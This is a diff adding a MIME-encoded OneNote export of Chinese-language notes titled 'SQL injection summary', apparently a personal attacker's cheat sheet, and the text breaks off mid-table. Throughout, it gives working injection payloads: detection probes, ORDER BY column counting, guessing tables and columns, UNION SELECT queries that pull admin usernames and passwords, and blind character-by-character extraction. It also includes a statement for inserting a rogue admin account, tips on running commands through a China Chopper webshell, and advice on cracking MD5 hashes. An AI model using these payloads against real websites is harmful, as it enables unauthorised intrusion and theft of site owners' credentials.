@@ -1,0 +1,3198 @@
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="----=_NextPart_01D282BC.499D8C10"
+
+���ĵ�Ϊ�������ļ���ҳ����Ҳ��Ϊ��Web �������ļ����������������Ϣ�����������������༭����֧�֡�Web �������ļ���������֧�֡�Web ����������������� Windows? Internet Explorer?��
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.htm
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset="utf-8"
+
+<html xmlns:o=3D"urn:schemas-microsoft-com:office:office"
+xmlns:dt=3D"uuid:C2F41010-65B3-11d1-A29F-00AA00C14882"
+xmlns=3D"http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8">
+<meta name=3DProgId content=3DOneNote.File>
+<meta name=3DGenerator content=3D"Microsoft OneNote 15">
+<link id=3DMain-File rel=3DMain-File href=3Dfile8792.htm>
+<link rel=3DFile-List href=3D"file8792.files/filelist.xml">
+</head>
+
+<body lang=3Dzh-CN style=3D'font-family:微软雅黑;font-size:11.0pt'>
+
+<div style=3D'direction:ltr;border-width:100%'>
+
+<div style=3D'direction:ltr;margin-top:0in;margin-left:0in;width:16.95in'>
+
+<div style=3D'direction:ltr;margin-top:0in;margin-left:0in;width:2.2743in'>
+
+<p style=3D'margin:0in;font-size:20.0pt'><span style=3D'font-family:Calibri'
+lang=3Den-US>1. Sql</span><span style=3D'font-family:SimSun' lang=3Dzh-CN>�=
+��入总结</span></p>
+
+</div>
+
+<div style=3D'direction:ltr;margin-top:.0388in;margin-left:0in;width:1.6437=
+in'>
+
+<p style=3D'margin:0in;font-size:9.0pt;color:gray'><span style=3D'font-fami=
+ly:Calibri'>2015</span><span
+style=3D'font-family:SimSun'>年</span><span style=3D'font-family:Calibri'>=
+10</span><span
+style=3D'font-family:SimSun'>月</span><span style=3D'font-family:Calibri'>=
+26</span><span
+style=3D'font-family:SimSun'>日</span></p>
+
+<p style=3D'margin:0in;font-family:Calibri;font-size:9.0pt;color:gray'>21:5=
+8</p>
+
+</div>
+
+<div style=3D'direction:ltr;margin-top:.4159in;margin-left:.4722in;width:16=
+.4777in'>
+
+<ul style=3D'margin-left:.277in;direction:ltr;unicode-bidi:embed;margin-top=
+:0in;
+ margin-bottom:0in'>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt'
+ lang=3Den-US>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image001.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ style=3D'font-weight:bold'>【准备工作】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><a
+ href=3D"onenote:#1.3%20sql注入语句大全&amp;section-id=3D{2CD632FE-F7=
+00-420F-AEB4-60ED05CD72D1}&amp;page-id=3D{39FC1357-097A-4905-A93A-08294E3C2=
+60F}&amp;end&amp;base-path=3DF:\sync\Onenote\Hacker\web安全.one"><span
+ style=3D'font-weight:bold'>1.3 sql注入语句大全</span></a></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>And user&gt;0 </span><span lang=3Dzh-=
+CN>如果是</span><span
+ lang=3Den-US>ACCESS</span><span lang=3Dzh-CN>数据库</span><span lang=3D=
+en-US>,</span><span
+ lang=3Dzh-CN>那么返回的错误里一般会有</span><span lang=3Den-US=
+>&quot;</span><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Den-US>Microsoft JET
+ Database&quot;</span><span style=3D'background:yellow;mso-highlight:yellow'
+ lang=3Dzh-CN>关键定</span><span lang=3Dzh-CN>，如果是</span><span s=
+tyle=3D'background:yellow;
+ mso-highlight:yellow' lang=3Den-US>MSSQL</span><span style=3D'background:y=
+ellow;
+ mso-highlight:yellow' lang=3Dzh-CN>数据库的话返回的错误提示里=
+一般会含有</span><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Den-US>&quot;SQL
+ Server&quot;</span><span style=3D'background:yellow;mso-highlight:yellow'
+ lang=3Dzh-CN>关键了</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>用注入工具猜解到表段却猜解不到字段的�=
+�候，到网站后台右键查看源文件，一般账号密码后面的�=
+�是字段，之后在注入工具里添加字段进行猜解即可。</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>得知表段跟字段之后，使用<=
+/span><span lang=3Den-US>SQL</span><span
+ lang=3Dzh-CN>语句在</span><span lang=3Den-US>ACCESS</span><span lang=3D=
+zh-CN>数据库里加个用户名及密码的语句：</span><span
+ lang=3Den-US>Insert into admin(user,pwd) values(*jianmei*,*daxia*)</span><=
+/p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>菜刀里点击一句话木马右键�=
+��选择虚拟机终端，执行命令出现乱码时，返回去设置编�=
+��那里，将默认的</span><span
+ lang=3Den-US>GB2312</span><span lang=3Dzh-CN>改为</span><span lang=3Den-=
+US>UTF-8.</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>破解出</span><span lang=3Den-US>md=
+5</span><span
+ lang=3Dzh-CN>为</span><span lang=3Den-US>20</span><span lang=3Dzh-CN>位�=
+��果，只需要把前三位和后一位去掉，剩余</span><span
+ lang=3Den-US>16</span><span lang=3Dzh-CN>位拿去解密即可</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>php+mysql中，我们的第一步是判断字段数，�=
+�在asp+access中，我们的第一步是判断表名</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Sql Server</span><span lang=3Dzh-CN>�=
+��接符号为</span><span
+ lang=3Den-US>+<span style=3D'mso-spacerun:yes'>  </span>%2b </span><span
+ lang=3Dzh-CN>注释符为</span><span lang=3Den-US>--</span><span lang=3Dz=
+h-CN>，</span><span
+ lang=3Den-US>Oracle</span><span lang=3Dzh-CN>链接符号为</span><span l=
+ang=3Den-US>||</span><span
+ lang=3Dzh-CN>注释符号为</span><span lang=3Den-US>--</span><span lang=
+=3Dzh-CN>，</span><span
+ lang=3Den-US>mysql</span><span lang=3Dzh-CN>链接符号为空格</span><s=
+pan lang=3Den-US> %20</span><span
+ lang=3Dzh-CN>注释为</span><span lang=3Den-US>#,/**/,--</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>sql server</span><span lang=3Dzh-CN>�=
+��理员为</span><span
+ lang=3Den-US>sa </span><span lang=3Dzh-CN>，</span><span lang=3Den-US>mys=
+ql</span><span
+ lang=3Dzh-CN>为</span><span lang=3Den-US>root/anonymous</span><span lang=
+=3Dzh-CN>，</span><span
+ lang=3Den-US>oracle</span><span lang=3Dzh-CN>为</span><span lang=3Den-US>=
+sys</span><span
+ lang=3Dzh-CN>，</span><span lang=3Den-US>system</span><span lang=3Dzh-CN>=
+，</span><span
+ lang=3Den-US>dbsnmp</span><span lang=3Dzh-CN>，</span><span lang=3Den-US>=
+outln</span><span
+ lang=3Dzh-CN>用户</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>元数据是数据库内部包含的�=
+��据，数据库表的名称，列的数据类型与访问权限。</span>=
+<span
+ lang=3Den-US>mysql</span><span lang=3Dzh-CN>是</span><span lang=3Den-US>i=
+nformation_schema
+ sqlserver</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>php </span><span lang=3Dzh-CN>加</sp=
+an><span
+ lang=3Den-US> mysql<span style=3D'mso-spacerun:yes'>  </span></span><span
+ lang=3Dzh-CN>不支持堆叠查询</span><span lang=3Den-US><span style=3D=
+'mso-spacerun:yes'> 
+ </span></span><span lang=3Dzh-CN>与</span><span lang=3Den-US>mssql/postgr=
+esql</span><span
+ lang=3Dzh-CN>支持</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-size:11.0p=
+t'><span
+ style=3D'font-family:微软雅黑' lang=3Den-US>asp/asp.net</span><span st=
+yle=3D'font-family:
+ 微软雅黑' lang=3Dzh-CN>加</span><span style=3D'font-family:微软雅�=
+��' lang=3Den-US>mssql</span><span
+ style=3D'font-family:微软雅黑' lang=3Dzh-CN>支持</span><span style=
+=3D'font-family:Calibri'
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>     </span></span><span
+ style=3D'font-family:微软雅黑' lang=3Den-US>java</span><span style=3D'=
+font-family:微软雅黑'
+ lang=3Dzh-CN>不支持</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image001.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ style=3D'font-weight:bold'>【服务器报错处理方式】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>sql</span><span lang=3Dzh-CN>错误�=
+�息显示在页面上，对</span><span
+ lang=3Den-US>web</span><span lang=3Dzh-CN>浏览器可见。</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>sql</span><span lang=3Dzh-CN>错误�=
+�息在源代码里，前端不可见通过抓包工具可见。</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>检测到错误时跳转到另外一个界面，首页�=
+�者通用错误界面。</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>返回</span><span lang=3Den-US>http<=
+/span><span
+ lang=3Dzh-CN>错误代码</span><span lang=3Den-US>500</span><span lang=3D=
+zh-CN>错误。</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image001.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ style=3D'font-weight:bold'>【注入点查找】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span style=3D'background:yellow;mso-highlight:yellow'>�=
+��面中原本显示文章的地方显示了空白。这是说明这个站�=
+��闭了错误回显可以使用盲注</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>数字型</span><span lang=3Den-US><s=
+pan
+ style=3D'mso-spacerun:yes'>    </span></span><a
+ href=3D"http://www.xxx.com/show.asp?id=3D7"><span lang=3Den-US>http://www.=
+xxx.com/show.asp?id=3D7</span></a><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>     </span></span><span=
+ lang=3Dzh-CN>加</span><span
+ lang=3Den-US>* </span><span lang=3Dzh-CN>程序报错</span></p>
+ <div style=3D'direction:ltr'>
+ <table border=3D1 cellpadding=3D0 cellspacing=3D0 valign=3Dtop style=3D'di=
+rection:ltr;
+  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-w=
+idth:
+  1pt;margin-left:.3333in'>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.7041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US>-0</span><span lang=3Dzh-CN>�=
+�回正常页面</span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.5909in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US>-1</span><span lang=3Dzh-CN>�=
+�回错误页面</span></p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.7236in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US> Xor 1=3D1<span style=3D'mso-s=
+pacerun:yes'> 
+   </span></span><span lang=3Dzh-CN>返回错误</span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.6409in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US> Xor 1=3D2<span style=3D'mso-s=
+pacerun:yes'> 
+   </span></span><span lang=3Dzh-CN>返回正确</span></p>
+   </td>
+  </tr>
+ </table>
+ </div>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Url</span><span lang=3Dzh-CN>编码�=
+�：</span><span
+ lang=3Den-US>and 1=3D1 %20%61%6E%64%20%31%3D%31</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US><span style=3D'mso-spacerun:yes'>     =
+     
+ </span>And 1=3D2 %20%61%6E%64%20%31%3D%32</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>字符型</span><span lang=3Den-US><s=
+pan
+ style=3D'mso-spacerun:yes'>    </span></span><a
+ href=3D"http://www.xxx.com/show.asp?id=3Dade7"><span lang=3Den-US>http://w=
+ww.xxx.com/show.asp?id=3Dade7</span></a><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>      </span></span><sp=
+an
+ lang=3Dzh-CN>加</span><span lang=3Den-US>* </span><span lang=3Dzh-CN>程�=
+��报错</span></p>
+ <div style=3D'direction:ltr'>
+ <table border=3D1 cellpadding=3D0 cellspacing=3D0 valign=3Dtop style=3D'di=
+rection:ltr;
+  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-w=
+idth:
+  1pt;margin-left:.3333in'>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:2.2923in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US> *and *1*=3D*1 </span><span la=
+ng=3Dzh-CN>返回正常页面</span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:2.3118in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US> *and *1*=3D*2 </span><span la=
+ng=3Dzh-CN>返回错误页面</span></p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:2.2923in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US> '%2B'<span style=3D'mso-space=
+run:yes'> 
+   </span></span><span lang=3Dzh-CN>返回正常页面</span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:2.3118in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>加</span><span lang=3Den-US> '2%2B'asdf </span><span lang=
+=3Dzh-CN>返回错误页面</span></p>
+   </td>
+  </tr>
+ </table>
+ </div>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>文本型</p>
+ <div style=3D'direction:ltr'>
+ <table border=3D1 cellpadding=3D0 cellspacing=3D0 valign=3Dtop style=3D'di=
+rection:ltr;
+  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-w=
+idth:
+  1pt;margin-left:.3333in'>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.4888in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   style=3D'background:white' lang=3Den-US><span style=3D'mso-spacerun:yes'=
+> </span></span><span
+   style=3D'background:white' lang=3Dzh-CN>'&nbsp;</span><span style=3D'bac=
+kground:
+   white' lang=3Den-US>and</span><span style=3D'background:white' lang=3Dzh=
+-CN>&nbsp;</span><span
+   style=3D'background:white' lang=3Den-US>'1'=3D'1</span><span style=3D'ba=
+ckground:
+   white' lang=3Dzh-CN>&nbsp;&nbsp;&nbsp;成功</span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.452in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   style=3D'background:white' lang=3Den-US><span style=3D'mso-spacerun:yes'=
+> </span></span><span
+   style=3D'background:white' lang=3Dzh-CN>'&nbsp;</span><span style=3D'bac=
+kground:
+   white' lang=3Den-US>and</span><span style=3D'background:white' lang=3Dzh=
+-CN>&nbsp;</span><span
+   style=3D'background:white' lang=3Den-US>'1'=3D'2</span><span style=3D'ba=
+ckground:
+   white' lang=3Dzh-CN>&nbsp;&nbsp;&nbsp;错误</span></p>
+   </td>
+  </tr>
+ </table>
+ </div>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>如果报错提示这个：</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Microsoft JET Database Engine </span>=
+<span
+ lang=3Dzh-CN>错误</span><span lang=3Den-US> *80040e14* </span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>语法错误</span><span lang=3Den-US=
+> (</span><span
+ lang=3Dzh-CN>操作符丢失</span><span lang=3Den-US>) </span><span lang=
+=3Dzh-CN>在查询表达式</span><span
+ lang=3Den-US> *ID =3D 6 ord by* </span><span lang=3Dzh-CN>中。 </span></=
+p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>/fun/Function.asp</span><span lang=3D=
+zh-CN>，行</span><span
+ lang=3Den-US> 657</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>解明：</span><span style=3D'backgr=
+ound:yellow;
+ mso-highlight:yellow' lang=3Dzh-CN>通过</span><span style=3D'background:=
+yellow;
+ mso-highlight:yellow' lang=3Den-US> JET </span><span style=3D'background:y=
+ellow;
+ mso-highlight:yellow' lang=3Dzh-CN>引擎连接数据库，则是</span><s=
+pan style=3D'background:
+ yellow;mso-highlight:yellow' lang=3Den-US> Access</span><span style=3D'bac=
+kground:
+ yellow;mso-highlight:yellow' lang=3Dzh-CN>数据库，通过</span><span s=
+tyle=3D'background:
+ yellow;mso-highlight:yellow' lang=3Den-US> ODBC </span><span style=3D'back=
+ground:
+ yellow;mso-highlight:yellow' lang=3Dzh-CN>引擎连接数据库，则是</=
+span><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Den-US> MSSQL</span=
+><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Dzh-CN>数据库。=
+</span></p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image002.png" width=3D16 height=3D16 alt=3D分类>&n=
+bsp;<span
+ style=3D'font-weight:bold'>【联合注入】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>第二步：猜字段数</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>语句：</span><span lang=3Den-US>or=
+der by 5</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>如果猜</span><span lang=3Den-US>6<=
+/span><span
+ lang=3Dzh-CN>的时候返回出错，就继续往回猜，直到返回正�=
+��为止</span><span lang=3Den-US>...</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>第三步：猜表段</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US>and exists (select * from admin)</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>表段成立则返回正确</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>第四部：猜字段</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US>and exists (select username from admin)</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>字段成立则返回正确</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>第五部：联合查询获得显示�=
+��</span><span lang=3Den-US><span
+ style=3D'mso-spacerun:yes'>  </span>access</span><span lang=3Dzh-CN>必�=
+�有表名</span><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>   </span>mysql</span><span
+ lang=3Dzh-CN>不需要</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US>and 1=3D2 union select 1,2,3,4,5,6,7,8,9,10=
+,11 from
+ admin</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>会返回两个显示位</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>第六步：联合查询密码</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US>and 1=3D2 union select
+ 1,2,3,4,admin_name,admin_pwd,7,8,9,10,11 from admin</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>显示位会显示用户名和密码</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image002.png" width=3D16 height=3D16 alt=3D分类>&n=
+bsp;<span
+ style=3D'font-weight:bold'>【非联合注入】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>获取字段长度</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>and (select top 1 len(</span><span
+ lang=3Dzh-CN>字段名</span><span lang=3Den-US>) from </span><span lang=
+=3Dzh-CN>表名</span><span
+ lang=3Den-US>)&gt;0</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>直到返回错误的前一个数字为止</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>猜解字段内容</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>and (select top 1 asc(mid(</span><span
+ lang=3Dzh-CN>字段名</span><span lang=3Den-US>,N,1)) from </span><span l=
+ang=3Dzh-CN>表名</span><span
+ lang=3Den-US>)&gt;0</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>N</span><span lang=3Dzh-CN>代表要�=
+��取第几个字符通过</span><span
+ lang=3Den-US>ASCII</span><span lang=3Dzh-CN>码来判断要判断的范围=
+是</span><span lang=3Den-US>32~126</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>对于找不到用户名解决方式<=
+/span><span lang=3Den-US>:</span><span
+ lang=3Dzh-CN>通过后台登录页面查看源代码得到用户名控件�=
+��</span><span lang=3Den-US>name</span><span
+ lang=3Dzh-CN>值，添加到工具中继续跑，继而得到用户名。�=
+��键看源码，搜索</span><span lang=3Den-US>form</span></p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt'
+ lang=3Den-US>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:1.125in'><img
+ src=3D"file8792.files/image003.png" width=3D520 height=3D229></p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt'
+ lang=3Den-US>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image001.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ style=3D'font-weight:bold' lang=3Dzh-CN>【</span><span style=3D'font-weig=
+ht:bold'
+ lang=3Den-US>Access </span><span style=3D'font-weight:bold' lang=3Dzh-CN>�=
+��移注入】</span></p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt'>&nbsp;</p>
+ <div style=3D'direction:ltr'>
+ <table border=3D1 cellpadding=3D0 cellspacing=3D0 valign=3Dtop style=3D'di=
+rection:ltr;
+  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-w=
+idth:
+  1pt;margin-left:.3333in'>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.4347in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>猜字段数：</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:5.7763in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'
+   lang=3Den-US>order by 10</p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.4347in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>确认显示位：</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:5.7763in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'
+   lang=3Den-US>and 1=3D2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from a=
+dmin</p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.4541in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
